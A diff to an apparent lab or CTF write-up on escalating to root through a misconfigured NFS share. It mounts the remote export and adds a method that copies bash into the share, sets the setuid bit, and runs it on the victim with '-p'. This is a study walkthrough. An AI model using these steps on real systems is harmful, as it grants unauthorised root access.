@@ -182,6 +182,7 @@ $ mkdir /tmp/shared
 $ sudo mount -o rw 10.10.193.66:/home/backup /tmp/shared/
 ```
 
+Method 1: 
 Create file inside shared:
 ```c
 int main(){
@@ -211,3 +212,11 @@ drwxrwxrwt 1 root root   834 20. Feb 12:35 ..
 -rw-r--r-- 1 root root    99 20. Feb 12:33 root.c
 ```
 
+Method 2:
+```console
+$ cp /bin/bash .
+$ chmod +s bash
+
+Run on Victim with
+$ ./bash -p
+```
